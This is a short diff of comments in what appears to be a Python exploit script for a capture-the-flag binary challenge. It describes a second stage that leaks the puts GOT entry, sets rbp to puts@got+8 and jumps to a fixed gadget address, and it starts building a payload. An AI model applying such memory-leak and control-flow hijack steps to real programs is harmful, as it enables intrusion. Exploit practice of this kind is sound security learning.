@@ -58,7 +58,8 @@ if __name__ == "__main__":
 # Stage 2
 #
 # leak puts@got (and will kill the daemon)
-# store puts@got+8 into rbp & jump to 0x40051f
+# the binary kindly used fflush() (to ensure any buffered message printed before it dies)
+# store puts@got+8 into rbp & jump to 0x40051f (+8 is to compensate for 'lea xxx,[rbp-8]')
 
     PUTS_GOT = b.got['puts']
     payload = ""
